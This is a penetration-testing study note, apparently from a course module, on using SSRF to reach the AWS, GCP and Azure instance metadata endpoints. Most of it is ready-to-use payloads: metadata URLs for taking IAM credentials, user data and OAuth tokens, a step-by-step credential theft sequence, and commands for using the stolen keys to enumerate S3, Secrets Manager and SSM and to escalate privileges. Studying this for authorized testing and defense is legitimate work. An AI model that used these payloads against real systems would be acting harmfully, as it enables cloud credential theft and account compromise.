---
tags: [vapt, ssrf, cloud, intermediate]
difficulty: intermediate
module: "13 - SSRF"
topic: "13.09 SSRF — Cloud Metadata (AWS 169.254.169.254, GCP, Azure)"
portswigger_labs: ["SSRF with filter bypass via open redirection vulnerability"]
---

# 13.09 — SSRF to Cloud Metadata

## Why Cloud Metadata Is Critical

```
CLOUD INSTANCES HAVE A SPECIAL IP: 169.254.169.254
  This is the "link-local" metadata IP.
  ONLY accessible from WITHIN the cloud instance itself!
  
  The metadata endpoint provides:
  ✓ AWS IAM role credentials (AccessKeyId, SecretAccessKey, SessionToken!)
  ✓ Instance identity (account ID, region, instance ID)
  ✓ User data (often contains secrets passed at instance launch!)
  ✓ Network interface details
  ✓ Security group info
  
  IF APP IS ON CLOUD + HAS SSRF → SSRF TO 169.254.169.254 = CRITICAL!
  
  Credentials stolen → attacker accesses ALL cloud resources
  that the compromised role has permission to access!
```

---

## AWS Metadata Endpoints

```bash
# ROOT ENDPOINT:
url=http://169.254.169.254/latest/meta-data/

# KEY PATHS TO STEAL:
# 1. IAM CREDENTIALS (most critical!):
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns: role name (e.g., "EC2-S3-Access-Role")

url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-S3-Access-Role
# Returns JSON with: AccessKeyId, SecretAccessKey, Token (temporary creds!)

# 2. USER DATA (often has bootstrap secrets!):
url=http://169.254.169.254/latest/user-data
# May contain: passwords, API keys, config files, scripts

# 3. INSTANCE IDENTITY:
url=http://169.254.169.254/latest/dynamic/instance-identity/document
# Returns: accountId, region, instanceId, imageId, instanceType

# 4. HOSTNAME:
url=http://169.254.169.254/latest/meta-data/hostname

# 5. SECURITY GROUPS:
url=http://169.254.169.254/latest/meta-data/security-groups

# 6. NETWORK:
url=http://169.254.169.254/latest/meta-data/network/interfaces/macs/
url=http://169.254.169.254/latest/meta-data/local-ipv4
url=http://169.254.169.254/latest/meta-data/public-ipv4

# COMPLETE CREDENTIAL THEFT SEQUENCE:
# Step 1:
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Output: "EC2InstanceRole"

# Step 2:
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2InstanceRole
# Output:
# {
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "abc123xyz...",
#   "Token": "AQoXnyc4PI...",
#   "Expiration": "2024-01-01T00:00:00Z"
# }
```

---

## GCP Metadata Endpoints

```bash
# GCP METADATA URL:
http://metadata.google.internal/computeMetadata/v1/

# IMPORTANT: GCP requires header: Metadata-Flavor: Google
# But SSRF bypasses this — server-side request includes header automatically!
# Some implementations just need the URL without the header check

# KEY GCP ENDPOINTS:
url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Returns: OAuth token for the service account!
# { "access_token": "ya29.xxx...", "expires_in": 3599, "token_type": "Bearer" }

url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
# Lists service accounts attached to instance

url=http://metadata.google.internal/computeMetadata/v1/project/project-id
# Returns GCP project ID

url=http://metadata.google.internal/computeMetadata/v1/instance/
# Full instance metadata

# ALTERNATIVE IP (same as AWS):
url=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# USE STOLEN TOKEN:
curl -H "Authorization: Bearer ya29.TOKEN..." \
  "https://cloudresourcemanager.googleapis.com/v1/projects"
```

---

## Azure Metadata Endpoint

```bash
# AZURE IMDS (Instance Metadata Service):
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# REQUIRES HEADER: Metadata: true
# (but SSRF typically allows including custom headers OR app adds it)

# KEY AZURE ENDPOINTS:
url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Returns: compute, network info, subscription ID, resource group

url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# Returns: Azure management OAuth token!

# STEAL MANAGED IDENTITY CREDENTIALS:
url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net
# Token for Azure Key Vault access!
```

---

## Using Stolen Cloud Credentials

```bash
# AWS — CONFIGURE STOLEN CREDENTIALS:
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="abc123..."
export AWS_SESSION_TOKEN="AQoXnyc4PI..."

# ENUMERATE WHAT THE ROLE CAN ACCESS:
aws sts get-caller-identity           # → Who am I?
aws s3 ls                             # → List all S3 buckets
aws ec2 describe-instances            # → List EC2 instances
aws iam list-roles                    # → List IAM roles
aws secretsmanager list-secrets       # → List Secrets Manager secrets!
aws ssm describe-parameters           # → List SSM parameters (often has creds!)
aws lambda list-functions             # → List Lambda functions
aws rds describe-db-instances         # → List databases

# ESCALATE PRIVILEGES:
# If role has iam:PassRole + ec2:RunInstances → create admin role and use it!
pacu  # AWS exploitation framework

# GCP — USE STOLEN TOKEN:
curl -H "Authorization: Bearer STOLEN_TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects"

# AZURE — USE STOLEN TOKEN:
az login --access-token STOLEN_TOKEN
az resource list
```

---

## Metadata Endpoint Quick Reference

```
CLOUD PROVIDER   URL                                     NOTES
────────────────────────────────────────────────────────────────────────
AWS              169.254.169.254/latest/meta-data/       No special header
AWS              169.254.169.254/latest/user-data        Bootstrap scripts
GCP              metadata.google.internal/computeMetadata/v1/  header: Metadata-Flavor: Google
GCP              169.254.169.254/computeMetadata/v1/     Alternative IP
Azure            169.254.169.254/metadata/instance?...  header: Metadata: true
Digital Ocean    169.254.169.254/metadata/v1/
Alibaba Cloud    100.100.100.200/latest/meta-data/
Oracle Cloud     169.254.169.254/opc/v2/instance/
```

---

## Related Notes
- [[01 - What is SSRF]] — fundamentals
- [[10 - SSRF AWS IMDSv1 vs IMDSv2]] — IMDSv2 protection and bypass
- [[14 - SSRF Localhost Bypass]] — bypassing 169.254.169.254 filters
- [[17 - SSRF WAF Bypass]] — WAF bypass for metadata endpoint
- [[19 - SSRF to Cloud Credential Theft]] — full exploitation chain
- [[20 - Defense Allowlists IMDSv2]] — defense
